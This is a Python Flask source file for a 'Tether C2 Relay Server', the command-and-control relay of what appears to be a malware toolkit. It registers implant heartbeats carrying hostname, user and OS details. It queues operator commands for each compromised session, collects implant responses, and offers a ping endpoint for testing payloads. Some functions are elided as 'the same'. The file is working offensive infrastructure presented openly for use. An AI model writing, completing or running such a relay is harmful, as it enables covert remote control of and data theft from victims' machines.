# relay/relay_server.py (Definitive, with Final Diagnostics)
from flask import Flask, request, jsonify
import time, threading

app = Flask(__name__)
# ... (rest of the server config is the same) ...
active_sessions = {}
command_queue = {}
response_queue = {}
session_lock = threading.Lock()
command_lock = threading.Lock()
response_lock = threading.Lock()

# --- NEW CANARY ENDPOINT ---
@app.route('/ping', methods=['GET'])
def handle_ping():
    """ A simple endpoint to test basic connectivity from a payload. """
    print("\n" + "="*20)
    print(">>> PING RECEIVED! <<<")
    print("="*20 + "\n")
    return "pong", 200

@app.route('/implant/hello', methods=['POST'])
def handle_hello():
    try:
        data = request.json
        hostname = data.get("hostname", "Unknown")
        print(f"[+] Heartbeat Received! From: {hostname}")
    except Exception as e:
        print(f"[!] ERROR processing heartbeat: {e}")
        return "error: Invalid JSON", 400
    
    # ... (rest of the function is the same) ...
    session_id = data.get("session_id")
    c2_user = data.get("c2_user")
    if not session_id or not c2_user: 
        return "error: Missing session_id or c2_user", 400
    with session_lock:
        active_sessions.setdefault(c2_user, {})
        if session_id not in active_sessions[c2_user]:
            metadata = {"hostname": hostname, "user": data.get("user", "Unknown"), "os": data.get("os", "N/A"), "ip": "Resolving..."}
            active_sessions[c2_user][session_id] = {"metadata": metadata}
        active_sessions[c2_user][session_id]['last_seen'] = time.time()
    with command_lock:
        commands = command_queue.pop(session_id, [])
    return jsonify({"commands": commands})


# ... (All other routes: /c2/discover_sessions, /c2/task, etc. are the same) ...
@app.route('/c2/discover_sessions/<c2_user>', methods=['GET'])
def discover_sessions(c2_user):
    live_threshold = time.time() - 15; live_sessions = {}
    with session_lock:
        user_sessions = active_sessions.get(c2_user, {});
        for sid, data in user_sessions.items():
            if data.get("last_seen", 0) > live_threshold: live_sessions[sid] = data.get('metadata', {})
    return jsonify({"sessions": live_sessions})

@app.route('/c2/task', methods=['POST'])
def handle_task():
    data = request.json; session_id = data.get("session_id"); command = data.get("command")
    with command_lock: command_queue.setdefault(session_id, []).append(command)
    return jsonify({"status": "ok"})

@app.route('/implant/response', methods=['POST'])
def handle_response():
    data = request.json; session_id = data.get("session_id")
    with response_lock: response_queue.setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

@app.route('/c2/get_responses', methods=['POST'])
def get_responses():
    session_id = request.json.get("session_id")
    with response_lock: responses = response_queue.pop(session_id, [])
    return jsonify({"responses": responses})

if __name__ == '__main__': 
    print("="*40)
    print("Tether C2 Relay Server is RUNNING.")
    print("Listening for connections...")
    print("="*40)
    app.run(host='0.0.0.0', port=5001)